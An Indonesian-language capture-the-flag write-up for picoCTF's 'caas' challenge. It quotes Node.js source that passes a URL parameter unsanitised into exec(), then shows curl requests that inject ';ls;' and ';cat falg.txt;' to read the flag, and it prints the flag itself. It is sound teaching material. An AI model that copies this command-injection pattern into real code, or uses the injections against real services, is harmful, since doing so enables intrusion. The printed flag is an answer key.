# caas
- Link: https://play.picoctf.org/practice/challenge/202?category=1&page=2

## Tantangan
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

## Penyelesaian
- Buka URL https://caas.mars.picoctf.net/ di browser


- Dari petunjuk diatas kita bisa melakukan request ke `https://caas.mars.picoctf.net/cowsay/{message}`. Sekarang kita coba isi parameter `message` dengan `test` lalu kirim menggunakan tool `curl`
```sh
curl https://caas.mars.picoctf.net/cowsay/test
```

- Di tantangan tersebut, terdapat lampiran file `index.js` yang berisi source code sebagai berikut
```sh
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```
- Di source code diatas terdapat fungsi `exec()` dimana fungsi ini akan menjalankan perintah `shell` sehingga kita melakukan serangan OS command injection dengan mem by pass paramter `message` di URL. Sekarang kita coba injeksikan perintah `ls`
```sh
curl "https://caas.mars.picoctf.net/cowsay/test;ls;"
```

- Dari hasil diatas terdapat file `falg.txt` yang berisi flag. Sekarang kita coba injeksikan perintah untuk membaca isi file tersebut
```sh
curl "https://caas.mars.picoctf.net/cowsay/test;cat%20falg.txt;"
```

- Flag
```sh
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```